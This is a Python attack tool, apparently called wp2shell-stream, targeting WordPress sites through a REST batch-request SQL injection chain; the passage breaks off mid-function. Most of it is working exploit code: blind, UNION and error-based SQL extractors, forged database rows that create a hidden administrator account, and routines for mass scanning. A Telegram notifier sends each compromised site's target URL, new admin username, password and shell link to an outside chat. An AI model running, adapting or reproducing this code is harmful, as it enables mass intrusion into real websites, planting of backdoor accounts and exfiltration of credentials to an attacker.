#!/usr/bin/env python3
"""wp2shell-stream: Create -> Login -> Shell -> Core update"""

import argparse
import base64
import hashlib
import html
import io
import json
import os
import re
import secrets
import ssl
import sys
import time
import threading
import uuid
import zipfile
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, FIRST_COMPLETED, wait
import dataclasses
from dataclasses import dataclass, field
from http.cookiejar import CookieJar, Cookie

# Windows console / piped stdout can't encode the box-drawing banner (cp1252).
# Reconfigure streams to UTF-8-with-replace so mass runs never die on print().
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

__version__ = "2.3-stream"
BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  wp2shell-stream v2.3 - Streaming Scanner + Creator        ║
║  CVE-2026-63030 + CVE-2026-60137                           ║
║  Create → Login → Shell → Core Update                      ║
╚══════════════════════════════════════════════════════════════╝
"""

_DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0.0.0"
_FULL_CHAIN = {(6,9,n) for n in range(5)} | {(7,0,0),(7,0,1)}
_PATCHED = {(6,8,6),(6,9,5),(7,0,2),(7,1,0)}

_UPDATE_MIN = (7, 0, 2)
_PRIMER = {"method": "POST", "path": "///"}
_PRIMER_HTTP = {"method": "POST", "path": "http://:"}

_CONFUSION_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")

_BLIND_SINKS = (
    ("posts+users", "/wp/v2/posts", None, "/wp/v2/users"),
    ("posts+posts", "/wp/v2/posts", None, "/wp/v2/posts"),
    ("posts+pages", "/wp/v2/posts", None, "/wp/v2/pages"),
    ("posts+comments", "/wp/v2/posts", None, "/wp/v2/comments"),
    ("posts+media", "/wp/v2/posts", None, "/wp/v2/media"),
    ("posts+tags", "/wp/v2/posts", None, "/wp/v2/tags"),
    ("cats+cats", "/wp/v2/categories", "cat", "/wp/v2/categories"),
    ("cats+posts", "/wp/v2/categories", "cat", "/wp/v2/posts"),
    ("cats+users", "/wp/v2/categories", "cat", "/wp/v2/users"),
    ("pages+users", "/wp/v2/pages", None, "/wp/v2/users"),
    ("pages+posts", "/wp/v2/pages", None, "/wp/v2/posts"),
    ("tags+tags", "/wp/v2/tags", "tag", "/wp/v2/tags"),
    ("tags+posts", "/wp/v2/tags", "tag", "/wp/v2/posts"),
)

_COMMENT_STYLES = (
    ("-- -", lambda cond: f"0) AND ({cond})-- -"),
    ("#", lambda cond: f"0) AND ({cond})#"),
    ("/**/", lambda cond: f"0)/**/AND/**/({cond})-- -"),
    ("OR-true", lambda cond: f"0) OR ({cond})-- -"),
    ("and-space", lambda cond: f"0) and ({cond})-- -"),
    ("%23", lambda cond: f"0) AND ({cond})%23"),
)

_UNION_SINKS = (
    ("posts/999999", "/wp/v2/posts", "/wp/v2/posts/999999"),
    ("pages/999999", "/wp/v2/posts", "/wp/v2/pages/999999"),
    ("posts/1", "/wp/v2/posts", "/wp/v2/posts/1"),
    ("cats+posts/999999", "/wp/v2/categories", "/wp/v2/posts/999999"),
)

_WRITE_SINKS = (
    ("widgets", "/wp/v2/widgets", {"per_page": -1, "orderby": "none", "context": "view"}),
    ("posts", "/wp/v2/posts", {"per_page": -1, "orderby": "none", "context": "view"}),
    ("pages", "/wp/v2/pages", {"per_page": -1, "orderby": "none", "context": "view"}),
    ("media", "/wp/v2/media", {"per_page": -1, "orderby": "none", "context": "view"}),
)

_COLOR = True
# Shell live check: many custom shells only respond with this query + title
_SHELL_PROBE_QS = "x-head=function"
_SHELL_OK_TITLE = "Runtime - File Configuration"
# Hard cap for the whole shell deploy (7 surfaces). Anything slower is skipped.
DEPLOY_BUDGET_SEC = 35.0
# Bound in-flight futures so multi-million line lists never materialize in RAM.
_FUTURE_BACKLOG_FACTOR = 4

def c(s): return f"\033[{s}m"
G,R,Y,B,M = c(32),c(31),c(33),c(36),c(35)

def log(m, t="*"):
    if t == '*':
        color, label = B, '[*]'
    elif t == '+':
        color, label = G, '[+]'
    elif t == '-':
        color, label = R, '[-]'
    elif t == '!':
        color, label = Y, '[!]'
    elif t == 'v':
        color, label = M, '[🔥]'
    else:
        color, label = B, '[*]'
    if _COLOR:
        print(f"{color}{label}{c(0)} {m}")
    else:
        print(f"{label} {m}")

TELEGRAM_TOKEN = None
TELEGRAM_CHAT_ID = None

def send_telegram(message):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        opener.open(req, timeout=10).read()
        return True
    except Exception as e:
        log(f"Failed to send Telegram notification: {e}", "!")
        return False

def notify_telegram(target, username, password, email, shell_url=None, login_url=None,
                    update_info=None):
    """Build + send WP2SHELL notification (async). Always includes Shell line when present."""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return

    def _run(t=target, u=username, p=password, e=email, s=shell_url, lu=login_url,
             ui=update_info):
        try:
            t_target = html.escape(t)
            # Never show bare site root as login (empty form action bug)
            login = lu or (t.rstrip("/") + "/wp-login.php")
            try:
                lp = urllib.parse.urlsplit(login)
                if not lp.path or lp.path.rstrip("/") in ("", "/"):
                    login = t.rstrip("/") + "/wp-login.php"
            except Exception:
                login = t.rstrip("/") + "/wp-login.php"
            t_login = html.escape(login)
            msg = (
                f"<b>WP2SHELL!</b>\n"
                f"Target: {t_target}\n"
                f"Login: {t_login}\n"
                f"Username: <code>{html.escape(u)}</code>\n"
                f"Password: <code>{html.escape(p)}</code>\n"
                f"Email: {html.escape(e)}\n"
            )
            if s:
                # ensure probe query in Telegram link
                su = s if "x-head=" in s else (
                    s + ("&" if "?" in s else "?") + _SHELL_PROBE_QS
                )
                msg += f"Shell: <code>{html.escape(su)}</code>\n"
            else:
                msg += "Shell: -\n"
            if ui:
                vb = _ver_str(ui.get("version_before") or ui.get("version"))
                va = _ver_str(ui.get("version_after")) if ui.get("version_after") else "-"
                if ui.get("updated"):
                    msg += f"Core: UPDATED {html.escape(vb)} → {html.escape(va)}\n"
                else:
                    msg += f"Core: {html.escape(vb)} ({html.escape(str(ui.get('reason') or '-'))})\n"
            send_telegram(msg)
        except Exception as ex:
            log(f"Telegram notify error: {ex}", "!")

    threading.Thread(target=_run, daemon=True).start()

write_lock = threading.Lock()
total_vuln = 0
total_success = 0
total_fail = 0
stats_lock = threading.Lock()

@dataclass
class Cfg:
    timeout: float = 15
    proxy: str = None
    insecure: bool = True
    headers: dict = field(default_factory=dict)
    ua: str = _DEFAULT_UA
    retries: int = 0
    delay: float = 0.0

    def opener(self, *extra_handlers):
        h = list(extra_handlers)
        if self.proxy:
            h.append(urllib.request.ProxyHandler({"http":self.proxy,"https":self.proxy}))
        if self.insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            h.append(urllib.request.HTTPSHandler(context=ctx))
        return urllib.request.build_opener(*h)

    def send(self, o, req):
        if self.delay: time.sleep(self.delay)
        last_exc = None
        for a in range(self.retries+1):
            try:
                return self._resp(o.open(req, timeout=self.timeout))
            except urllib.error.HTTPError as e:
                # Retry 5xx (transient server errors); return 4xx as-is
                if e.code >= 500 and a < self.retries:
                    last_exc = e
                    time.sleep(0.25*(a+1))
                    continue
                return self._resp(e)
            except Exception as e:
                last_exc = e
                if a < self.retries: time.sleep(0.25*(a+1))
        raise last_exc if last_exc else Exception("send: no response (unknown error)")

    def _resp(self, r):
        try:
            body = r.read().decode(errors="replace")
        except Exception:
            body = ""
        finally:
            try:
                r.close()
            except Exception:
                pass
        status = getattr(r, 'status', None)
        if status is None:
            status = getattr(r, 'code', 0)
        return type('Resp', (), {'status': status, 'body': body})()

class Batch:
    def __init__(self, u, c=None, rr=None):
        self.u, self.c, self.rr = u.rstrip("/"), c or Cfg(), rr
        self.o = self.c.opener()

        self._blind_sink = None
        self._union_sink = None
        self._write_sink = None
        self._comment = None
        self._primer = _PRIMER
        self._time_mode = False
        self._time_sleep = 2.0

    def _ep(self, rr):
        return f"{self.u}/?rest_route=/batch/v1" if rr else f"{self.u}/wp-json/batch/v1"

    def resolve(self):
        if self.rr is not None:
            return self._ep(self.rr)
        for rr in (0, 1):
            try:
                if self._post(self._ep(bool(rr)), {"requests": []}).status == 207:
                    self.rr = bool(rr)
                    return self._ep(self.rr)
            except Exception:
                pass
        self.rr = 0
        return self._ep(0)

    def _post(self, u, p):
        req = urllib.request.Request(u, data=json.dumps(p).encode(), method="POST",
            headers=self.c.headers | {"Content-Type": "application/json", "User-Agent": self.c.ua})
        return self.c.send(self.o, req)

    def _get(self, u):
        req = urllib.request.Request(u, method="GET",
            headers=self.c.headers | {"User-Agent": self.c.ua})
        return self.c.send(self.o, req)

    def post(self, p):
        return self._post(self.resolve(), p)

    def _carrier_body(self, body_kind, inner_reqs):
        if body_kind == "cat":
            return {"name": f"x{secrets.token_hex(3)}", "requests": inner_reqs}
        if body_kind == "tag":
            return {"name": f"t{secrets.token_hex(3)}", "requests": inner_reqs}
        return {"requests": inner_reqs}

    def _batch_wrap(self, carrier_path, carrier_body, primer=None):
        p = primer or self._primer
        return {"requests": [
            p,
            {"method": "POST", "path": carrier_path, "body": carrier_body},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def _payload_for(self, sink, author_not_in, primer=None):
        _, carrier, body_kind, inject_path = sink
        enc = urllib.parse.quote(author_not_in, safe="")
        p = primer or self._primer
        inner = {"requests": [
            p,
            {"method": "GET", "path": f"{inject_path}?author_exclude={enc}"},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]}
        return self._batch_wrap(carrier, self._carrier_body(body_kind, inner["requests"]), primer=p)

    def inject(self, s):

        sink = self._blind_sink or _BLIND_SINKS[0]
        return self.post(self._payload_for(sink, s))

    def inject_sink(self, sink, s, primer=None):
        return self.post(self._payload_for(sink, s, primer=primer))

    def union_inject(self, author_not_in):
        sink = self._union_sink or _UNION_SINKS[0]
        return self._union_inject_sink(sink, author_not_in)

    def _union_inject_sink(self, sink, author_not_in, primer=None):
        _, carrier, item_path = sink
        q = urllib.parse.urlencode({
            "author_exclude": author_not_in,
            "orderby": "none",
            "per_page": "500",
        })
        p = primer or self._primer
        if carrier in ("/wp/v2/categories", "/wp/v2/tags"):
            body_kind = "cat" if "categories" in carrier else "tag"
            inner_reqs = [
                p,
                {"method": "GET", "path": f"{item_path}?{q}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
            body = self._carrier_body(body_kind, inner_reqs)
        else:
            body = {"requests": [
                p,
                {"method": "GET", "path": f"{item_path}?{q}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]}
        return self.post(self._batch_wrap(carrier, body, primer=p))

    def rows(self, r):
        try:
            data = json.loads(r.body) if r.body else None
            if not isinstance(data, dict):
                return None

            try:
                result = data["responses"][1]["body"]["responses"][1]["body"]
                if isinstance(result, list):
                    return result
            except (KeyError, IndexError, TypeError):
                pass

            def walk(o, depth=0):
                if depth > 6:
                    return None
                if isinstance(o, list) and o and isinstance(o[0], dict) and (
                    "id" in o[0] or "slug" in o[0] or "name" in o[0]
                ):
                    return o
                if isinstance(o, dict):
                    for v in o.values():
                        hit = walk(v, depth + 1)
                        if hit is not None:
                            return hit
                if isinstance(o, list):
                    for v in o:
                        hit = walk(v, depth + 1)
                        if hit is not None:
                            return hit
                return None
            return walk(data)
        except Exception:
            return None

    def oracle(self, r):
        """Boolean oracle: True if nested posts collection indicates SQL match.

        Prefers X-WP-Total header (forged leftovers can empty body while total>0);
        falls back to a non-empty JSON list body. Mirrors i.py's oracle so blind
        extraction stays reliable when the posts body is emptied by REST filters.
        """
        try:
            data = json.loads(r.body) if r.body else None
            if not isinstance(data, dict):
                return False
            nested = data["responses"][1]["body"]["responses"][1]
            if not isinstance(nested, dict):
                return False
            headers = nested.get("headers") or {}
            if isinstance(headers, dict):
                for key in ("X-WP-Total", "x-wp-total"):
                    total = headers.get(key)
                    if total is not None:
                        try:
                            return int(total) > 0
                        except (TypeError, ValueError):
                            pass
            body = nested.get("body")
            return isinstance(body, list) and len(body) > 0
        except Exception:
            return False

    def probe(self):
        scan_cfg = dataclasses.replace(self.c, timeout=min(self.c.timeout, 8), retries=0)
        req = urllib.request.Request(self.resolve(), data=json.dumps({"requests":[]}).encode(), method="POST",
            headers=self.c.headers | {"Content-Type":"application/json","User-Agent":self.c.ua})
        return scan_cfg.send(self.o, req)

    @staticmethod
    def _walk_codes(value, out=None):
        if out is None:
            out = set()
        if isinstance(value, dict):
            c = value.get("code")
            if isinstance(c, str):
                out.add(c)
            for v in value.values():
                Batch._walk_codes(v, out)
        elif isinstance(value, list):
            for v in value:
                Batch._walk_codes(v, out)
        return out

    def confusion(self, fast=False):
        scan_cfg = dataclasses.replace(self.c, timeout=min(self.c.timeout, 8), retries=0)
        primers = (self._primer, _PRIMER) if fast else (self._primer, _PRIMER, _PRIMER_HTTP)
        seen = []
        for primer in primers:
            if primer in seen:
                continue
            seen.append(primer)
            try:
                r = scan_cfg.send(self.o, urllib.request.Request(
                    self.resolve(),
                    data=json.dumps({"requests": [
                        primer,
                        {"method": "POST", "path": "/wp/v2/posts"},
                        {"method": "POST", "path": "/wp/v2/block-renderer/core/paragraph"},
                        {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
                    ]}).encode(), method="POST",
                    headers=self.c.headers | {"Content-Type":"application/json","User-Agent":self.c.ua}))
                body = r.body or ""
                try:
                    codes = self._walk_codes(json.loads(body) if body else {})
                except Exception:
                    codes = set()
                if any(m in codes for m in _CONFUSION_CODES) or any(m in body for m in _CONFUSION_CODES):
                    self._primer = primer
                    return True
            except Exception:
                pass
            if fast:
                break
        if not fast and self.confusion_structural():
            return True
        return False

    def confusion_structural(self):
        try:
            rows = self.rows(self.inject("99999999"))
            if isinstance(rows, list) and rows and isinstance(rows[0], dict):
                if "id" in rows[0] or "slug" in rows[0] or "title" in rows[0]:
                    return True
        except Exception:
            pass
        return False

    def pick_blind_sink(self, verbose=False, fast=False):
        if self._blind_sink and self._comment:
            return True
        primer = self._primer or _PRIMER

        def _try_bool(sink, cname, cbuild, primer):
            try:
                t = bool(self.rows(self.inject_sink(sink, cbuild("1=1"), primer=primer)))
                f = bool(self.rows(self.inject_sink(sink, cbuild("1=0"), primer=primer)))
            except Exception:
                return False
            if t and not f:
                self._blind_sink = sink
                self._comment = (cname, cbuild)
                self._primer = primer
                self._time_mode = False
                return True
            return False

        if verbose:
            log("    SQLi probe: boolean default...", "*")
        if _try_bool(_BLIND_SINKS[0], _COMMENT_STYLES[0][0], _COMMENT_STYLES[0][1], primer):
            return True

        if verbose:
            log("    SQLi probe: alt sinks...", "*")
        for sink in _BLIND_SINKS[1:4]:
            if _try_bool(sink, _COMMENT_STYLES[0][0], _COMMENT_STYLES[0][1], primer):
                return True

        if fast:
            return False

        for cname, cbuild in _COMMENT_STYLES[1:3]:
            if _try_bool(_BLIND_SINKS[0], cname, cbuild, primer):
                return True

        if verbose:
            log("    SQLi probe: time-based (1 try)...", "*")
        try:
            sleep_s = 1.2
            t0 = time.time()
            self.inject_sink(_BLIND_SINKS[0], _COMMENT_STYLES[0][1](f"IF(1=1,SLEEP({sleep_s:g}),0)=0"), primer=primer)
            dt_true = time.time() - t0
            t1 = time.time()
            self.inject_sink(_BLIND_SINKS[0], _COMMENT_STYLES[0][1](f"IF(1=0,SLEEP({sleep_s:g}),0)=0"), primer=primer)
            dt_false = time.time() - t1
            if dt_true >= sleep_s * 0.65 and dt_false < sleep_s * 0.55:
                self._blind_sink = _BLIND_SINKS[0]
                self._comment = _COMMENT_STYLES[0]
                self._primer = primer
                self._time_mode = True
                self._time_sleep = sleep_s
                return True
        except Exception:
            pass
        return False

    def _read_union_ok_quick(self):
        try:
            body = self.union_inject(
                "0) UNION SELECT " + self._union_cols_probe() + "-- -"
            ).body or ""
            if "||4f4b||" in body.lower() or re.search(r"\|\|4[fF]4[bB]\|\|", body):
                self._union_sink = _UNION_SINKS[0]
                return True
            m = re.search(r"\|\|([0-9A-Fa-f]*)\|\|", body)
            if m:
                d = m.group(1)
                if len(d) % 2:
                    d = d[:-1]
                if bytes.fromhex(d).decode("utf-8", "replace") == "OK":
                    self._union_sink = _UNION_SINKS[0]
                    return True
        except Exception:
            pass
        return False

    def pick_union_sink(self):
        if self._union_sink:
            return True
        if self._read_union_ok_quick():
            return True
        probe = "0) UNION SELECT " + self._union_cols_probe() + "-- -"
        for sink in _UNION_SINKS[1:3]:
            try:
                body = self._union_inject_sink(sink, probe, primer=self._primer or _PRIMER).body or ""
            except Exception:
                continue
            if "||4f4b||" in body.lower() or re.search(r"\|\|4[fF]4[bB]\|\|", body):
                self._union_sink = sink
                return True
        return False

    @staticmethod
    def _union_cols_probe():

        date = "0x323032302d30312d30312030303a30303a3030"
        cols = []
        for i in range(1, 24):
            if i == 1:
                cols.append("999999")
            elif i in (3, 4, 15, 16):
                cols.append(date)
            elif i == 6:
                cols.append("CONCAT(0x7c7c,HEX(CAST((SELECT 0x4f4b)AS CHAR)),0x7c7c)")
            elif i == 8:
                cols.append("0x7075626c697368")
            elif i == 21:
                cols.append("0x706f7374")
            else:
                cols.append(str(i))
        return ",".join(cols)

    def pick_write_sink(self):
        if self._write_sink:
            return self._write_sink
        self._write_sink = _WRITE_SINKS[0]
        return self._write_sink

    def sink_info(self):
        b = self._blind_sink[0] if self._blind_sink else "-"
        u = self._union_sink[0] if self._union_sink else "-"
        w = self._write_sink[0] if self._write_sink else "-"
        c = self._comment[0] if self._comment else "-"
        mode = "time" if getattr(self, "_time_mode", False) else "bool"
        return f"blind={b} union={u} write={w} comment={c} mode={mode}"

class BlindSQLi:

    technique = "blind"
    _MIN, _MAX = 0, 255
    def __init__(self, c, sleep=2):
        self.c, self.sleep, self.req = c, sleep, 0
    def confirm(self, verbose=False, fast=False):
        if hasattr(self.c, "pick_blind_sink") and self.c.pick_blind_sink(verbose=verbose, fast=fast):
            return True
        return self._t("1=1") and not self._t("1=0")
    def has_rows(self):
        return self._t("1=1")
    def _payload(self, cond):
        if getattr(self.c, "_time_mode", False):
            sl = getattr(self.c, "_time_sleep", self.sleep) or self.sleep
            base = f"IF(({cond}),SLEEP({sl:g}),0)=0"
            if self.c._comment:
                return self.c._comment[1](base)
            return f"0) AND ({base})-- -"
        if self.c._comment:
            return self.c._comment[1](cond)
        return f"0) AND ({cond})-- -"
    def _t(self, cond):
        self.req += 1
        try:
            if getattr(self.c, "_time_mode", False):
                sl = getattr(self.c, "_time_sleep", self.sleep) or self.sleep
                t0 = time.time()
                self.c.inject(self._payload(cond))
                return (time.time() - t0) >= sl * 0.7
            # Prefer X-WP-Total header oracle; fall back to body rows. One retry
            # on transient decode/transport errors keeps long extracts stable.
            for _ in range(2):
                try:
                    r = self.c.inject(self._payload(cond))
                    if hasattr(self.c, "oracle"):
                        return self.c.oracle(r)
                    return bool(self.c.rows(r))
                except Exception:
                    continue
            return False
        except Exception:
            return False
    def extract(self, expr, max_len=128):
        buf = bytearray()
        for pos in range(1, max_len + 1):
            probe = f"ORD(BINARY SUBSTRING(COALESCE(({expr}),''),{pos},1))"
            if not self._t(f"{probe} > 0"):
                break
            lo, hi = self._MIN + 1, self._MAX
            while lo < hi:
                mid = (lo + hi) // 2
                if self._t(f"{probe} > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            buf.append(lo)
        return buf.decode("utf-8", "replace")
    def integer(self, expr):
        t = self.extract(expr).strip()
        if t and not t.lstrip("-").isdigit():
            m = re.search(r"-?\d+", t)
            t = m.group(0) if m else t
        if not t or not t.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expr!r}, got {t!r}")
        return int(t)

class UnionSQLi:

    technique = "union"
    _COLUMNS, _TITLE_COL = 23, 6
    _DATE = "0x323032302d30312d30312030303a30303a3030"
    _PUBLISH, _POST = "0x7075626c697368", "0x706f7374"
    def __init__(self, c):
        self.c, self.req = c, 0
    def avail(self):

        if getattr(self.c, "_union_sink", None):
            return True
        if hasattr(self.c, "pick_union_sink") and self.c.pick_union_sink():
            return True
        return self._read("SELECT 0x4f4b") == "OK"
    def extract(self, e):
        return self._read(e) or ""
    def integer(self, e):
        t = (self._read(f"SELECT ({e})") or "").strip()
        # Strip non-digit noise from WAF/HTML pollution
        if t and not t.lstrip("-").isdigit():
            m = re.search(r"-?\d+", t)
            t = m.group(0) if m else t
        if not t or not t.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {e!r}, got {t!r}")
        return int(t)
    def _read(self, e):
        self.req += 1
        for _ in range(2):
            try:
                r = self.c.union_inject(f"0) UNION SELECT {self._cols(e)}-- -").body
            except Exception:
                r = None
            m = re.search(r"\|\|([0-9A-Fa-f]*)\|\|", r or "")
            if m:
                d = m.group(1)
                if len(d) % 2:
                    d = d[:-1]
                try:
                    return bytes.fromhex(d).decode("utf-8", "replace")
                except Exception:
                    return None
            # transient empty / WAF hiccup — retry once
        return None
    def _cols(self, e):
        cols = []
        for i in range(1, self._COLUMNS + 1):
            if i == 1:
                cols.append("999999")
            elif i in (3, 4, 15, 16):
                cols.append(self._DATE)
            elif i == self._TITLE_COL:
                cols.append(f"CONCAT(0x7c7c,HEX(CAST(({e})AS CHAR)),0x7c7c)")
            elif i == 8:
                cols.append(self._PUBLISH)
            elif i == 21:
                cols.append(self._POST)
            else:
                cols.append(str(i))
        return ",".join(cols)

class ErrorSQLi:

    technique = "error"
    _CHUNK = 30
    def __init__(self, c):
        self.c, self.req = c, 0
    def avail(self):
        try:
            body = self.c.inject("EXTRACTVALUE(1,CONCAT(0x7e,'wp2sprobe'))").body or ""
        except Exception:
            return False
        return "wp2sprobe" in body
    def extract(self, e, max_len=128):
        result = ""
        offset = 1
        while len(result) < max_len:
            chunk = self._chunk(e, offset, self._CHUNK)
            if not chunk:
                break
            result += chunk
            offset += len(chunk)
            if len(chunk) < self._CHUNK:
                break
        return result
    def integer(self, e):
        t = (self.extract(e) or "").strip()
        if t and not t.lstrip("-").isdigit():
            m = re.search(r"-?\d+", t)
            t = m.group(0) if m else t
        if not t or not t.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {e!r}, got {t!r}")
        return int(t)
    def _chunk(self, e, offset, length):
        self.req += 1
        for _ in range(2):
            try:
                body = self.c.inject(
                    f"EXTRACTVALUE(1,CONCAT(0x7e,SUBSTR(({e}),{offset},{length})))"
                ).body or ""
            except Exception:
                body = ""
            m = re.search(r"~([^'\"<]*)", body)
            if m:
                return m.group(1)
            # transient empty / WAF hiccup — retry once
        return None

def select_extractor(client):
    """Auto-select the fastest SQLi extractor: UNION → error → blind."""
    u = UnionSQLi(client)
    try:
        if u.avail():
            return u
    except Exception:
        pass
    err = ErrorSQLi(client)
    try:
        if err.avail():
            return err
    except Exception:
        pass
    blind = BlindSQLi(client)
    try:
        if blind.confirm(verbose=False, fast=True):
            return blind
    except Exception:
        pass
    return None

def _mysql_hex(t): return f"0x{t.encode().hex()}" if t else "''"
_POST_DATE, _OEMBED_SIZE = "2020-01-01 00:00:00", 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

def _wp_row(i, **k):
    p = {"body":"","title":"","status":"publish","slug":"", "parent":0,"kind":"post","author":1}
    p.update(k)
    return ",".join([str(i), str(p["author"]), _mysql_hex(_POST_DATE), _mysql_hex(_POST_DATE),
        _mysql_hex(p["body"]), _mysql_hex(p["title"]), "''", _mysql_hex(p["status"]),
        _mysql_hex("closed"), _mysql_hex("closed"), "''", _mysql_hex(p["slug"]), "''", "''",
        _mysql_hex(_POST_DATE), _mysql_hex(_POST_DATE), "''", str(p["parent"]), "''", "0",
        _mysql_hex(p["kind"]), "''", "0"])

class AdminCreator:
    _ADMIN_PREFIX, _PASSWORD_PREFIX, _EMAIL_DOMAIN = "wp2_", "Wp2!", "wp2shell.invalid"

    _OEMBED_ATTRS = (
        'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}',
        'a:2:{s:5:"width";i:500;s:6:"height";i:750;}',
        'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";s:7:"discover";b:1;}',
        'a:1:{s:5:"width";s:3:"500";}',
        '',
    )
    def __init__(self, u, c=None, rr=None):
        self.u, self.c, self.rr = u, c or Cfg(), rr
        self.client = Batch(u, self.c, rr)
        self._render_cfg = dataclasses.replace(self.c, timeout=max(self.c.timeout, 60.0))
        self._render_client = Batch(u, self._render_cfg, rr)
        self._oembed_attr = _OEMBED_SIZE

    def create(self, quiet=False):

        src = select_extractor(self.client)
        self._src = src  # expose for later login-hint (hide-login slug) discovery
        if src is None:
            raise RuntimeError("no SQLi extractor available (UNION + error + blind all failed)")
        if not quiet:
            log(f"    extractor: {getattr(src, 'technique', '?')} ({self.client.sink_info()})", "*")
        if not self.client._write_sink:
            self.client.pick_write_sink()
        self._sync_render_sinks()

        ptable, blog_prefix, base_prefix = self._recover_prefixes(src)
        self._base_prefix = base_prefix  # expose for login-hint option reads
        cap, ser = _mysql_hex(blog_prefix + "capabilities"), _mysql_hex('s:13:"administrator";b:1;')
        # Multisite: users/usermeta are ALWAYS base_prefix (wp_users), not blog prefix (wp_1_users).
        # Capabilities meta_key uses blog_prefix (wp_1_capabilities).
        aid = 0
        for upref in (base_prefix, blog_prefix):
            try:
                aid = src.integer(
                    f"SELECT u.ID FROM `{upref}users` u JOIN `{upref}usermeta` m ON m.user_id=u.ID "
                    f"WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1"
                )
            except Exception:
                aid = 0
            if aid >= 1:
                base_prefix = upref
                break
        if aid < 1:
            # Fallback: any administrator-like capability meta
            try:
                aid = src.integer(
                    f"SELECT u.ID FROM `{base_prefix}users` u JOIN `{base_prefix}usermeta` m ON m.user_id=u.ID "
                    f"WHERE INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1"
                )
            except Exception:
                aid = 0
        if aid < 1:
            raise RuntimeError(
                f"could not find administrator ID (blog={blog_prefix!r} base={base_prefix!r})"
            )

        n = secrets.token_hex(6)
        embeds, ids = self._get_oembed_backing(src, ptable, n)
        if any(i < 1 for i in ids) or len(set(ids)) != 3:
            raise RuntimeError(f"oEmbed backing IDs missing: {ids}")

        outer = 1800000000 + secrets.randbelow(100000000)
        nav, inner = outer + 1, outer + 2
        changeset, cache, reqid = ids
        trigger_body = f'[embed width="500" height="750"]{embeds[1]}[/embed]'
        changeset_payload = json.dumps({
            f"nav_menu_item[{nav}]": {
                "type": "nav_menu_item", "user_id": aid,
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0,
                    "type": "custom", "title": "generated", "url": "https://example.invalid/",
                    "target": "", "attr_title": "", "description": "", "classes": "", "xfn": "",
                    "status": "publish", "nav_menu_term_id": 0, "_invalid": False,
                },
            }
        }, separators=(",", ":"))
        rows = [
            _wp_row(0, body=trigger_body, title="trigger", slug="trigger"),
            _wp_row(changeset, body=changeset_payload, title="changeset", status="future",
                    slug=str(secrets.token_hex(8)), parent=outer, kind="customize_changeset"),
            _wp_row(outer, body="outer", title="outer", status="draft", slug="outer", parent=changeset),
            _wp_row(cache, title="cache", slug="cache", parent=changeset),
            _wp_row(nav, body="nav", title="nav", slug="nav", parent=reqid, kind="nav_menu_item"),
            _wp_row(reqid, body="parse", title="parse", status="parse", slug="parse", parent=inner, kind="request"),
            _wp_row(inner, body="inner", title="inner", status="draft", slug="inner", parent=reqid),
        ]
        username = f"{self._ADMIN_PREFIX}{n}"
        password = f"{self._PASSWORD_PREFIX}{secrets.token_urlsafe(15)}"
        email = f"{username}@{self._EMAIL_DOMAIN}"
        user_body = {"username": username, "password": password, "email": email, "roles": ["administrator"]}

        self._render(rows, [
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
        ])
        time.sleep(0.35)
        if not self._user_exists(src, base_prefix, username, attempts=2, delay=0.35):
            self._render(rows, [
                {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            ])
            time.sleep(0.4)
            if not self._user_exists(src, base_prefix, username, attempts=2, delay=0.4):
                raise RuntimeError("user write did not persist (no row in users table)")
        return type("Admin", (), {"username": username, "password": password, "email": email})()

    def _recover_prefixes(self, src):
        """Return (posts_table, blog_prefix, base_prefix).

        Single-site: wp_posts → blog=wp_ base=wp_
        Multisite:   wp_1_posts → blog=wp_1_ base=wp_  (users on base_prefix)
        """
        ptable = (src.extract(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1"
        ) or "").strip()
        # Reject garbage extracts (single char, no posts suffix, WAF noise)
        if not ptable or len(ptable) < 6 or not re.fullmatch(r"[A-Za-z0-9_$]+", ptable):
            raise RuntimeError("could not recover wp_posts table name")
        if not ptable.endswith("posts") or ptable in ("posts", "q", "x"):
            raise RuntimeError(f"bad posts table: {ptable!r}")
        blog_prefix = ptable[:-5]
        if not blog_prefix or not blog_prefix.endswith("_"):
            # rare: custom without trailing underscore still OK if alphanumeric
            if not blog_prefix:
                raise RuntimeError(f"empty prefix from {ptable!r}")

        utable = (src.extract(
